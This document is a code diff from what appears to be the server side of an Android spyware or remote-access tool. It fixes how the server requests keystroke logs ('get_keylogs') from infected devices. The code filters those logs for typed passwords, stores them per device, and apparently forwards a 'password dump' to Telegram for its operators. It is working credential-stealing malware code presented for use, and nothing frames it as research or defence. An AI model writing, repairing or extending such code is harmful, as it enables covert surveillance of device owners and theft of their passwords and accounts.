@@ -317,14 +317,17 @@ function _extractPasswordValue(text, fieldHint, isPasswordFlag, eventType) {
 }
 
 async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
-    // ── Step 1: fetch live keylogs from device using chunked streaming ──────────
-    // Mirrors exactly what PasswordsTab.jsx does: sendCommand(deviceId,'get_keylogs',{limit:1000})
-    // _sendAndCaptureChunked handles both chunked data:chunk streams and plain command:response.
+    // ── Step 1: fetch live keylogs from device ─────────────────────────────────
+    // get_keylogs returns a plain command:response (not chunked), so use _sendAndCapture.
+    // The Android LogManager returns {"success":true,"logs":[...],"count":N}.
     let liveEntries = [];
     try {
-        log('TELEGRAM', `Password dump: fetching keylogs from device ${deviceId} via chunked stream`);
-        const items = await _sendAndCaptureChunked(deviceId, 'get_keylogs', { limit: 1000 }, 60000);
-        if (items && items.length) liveEntries = items;
+        log('TELEGRAM', `Password dump: fetching keylogs from device ${deviceId}`);
+        const resp = await _sendAndCapture(deviceId, 'get_keylogs', { limit: 1000 }, 30000);
+        if (resp) {
+            const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
+            liveEntries = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
+        }
     } catch (_) {}
 
     // ── Step 2: also pull from in-memory cache + Redis (populated on last connect) ─
@@ -485,17 +488,19 @@ async function _autoSyncDevice(deviceId) {
     if ((now - (last.passwords || 0)) > SYNC_DEDUP_MS) {
         deviceLastSyncAt.set(deviceId, { ...(deviceLastSyncAt.get(deviceId) || {}), passwords: now });
         try {
-            const items = await _sendAndCaptureChunked(deviceId, 'get_keylogs', { limit: 2000 }, 60000);
-            const all = Array.isArray(items) ? items
-                : (() => { try { const d = typeof items === 'string' ? JSON.parse(items) : (items || {}); return d.entries || d.keylogs || d.logs || d.data || []; } catch { return []; } })();
-            const pwds = all.filter(e => {
-                const text = e.text || e.content || e.typedText || '';
-                const hint = e.fieldType || e.inputType || e.field || '';
-                return _looksLikePassword(text, hint, e.isPassword, e.eventType || '');
-            });
-            if (pwds.length) {
-                _mergeDevicePasswords(deviceId, pwds);
-                log('SYNC', `Passwords synced: ${pwds.length} new entries for ${deviceId} (total: ${(devicePasswords.get(deviceId) || []).length})`);
+            const resp = await _sendAndCapture(deviceId, 'get_keylogs', { limit: 2000 }, 60000);
+            if (resp) {
+                const d   = typeof resp === 'string' ? JSON.parse(resp) : resp;
+                const all = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
+                const pwds = all.filter(e => {
+                    const text = e.text || e.content || e.typedText || '';
+                    const hint = e.fieldType || e.inputType || e.field || '';
+                    return _looksLikePassword(text, hint, e.isPassword, e.eventType || '');
+                });
+                if (pwds.length) {
+                    _mergeDevicePasswords(deviceId, pwds);
+                    log('SYNC', `Passwords synced: ${pwds.length} new entries for ${deviceId} (total: ${(devicePasswords.get(deviceId) || []).length})`);
+                }
             }
         } catch (_) {}
     }
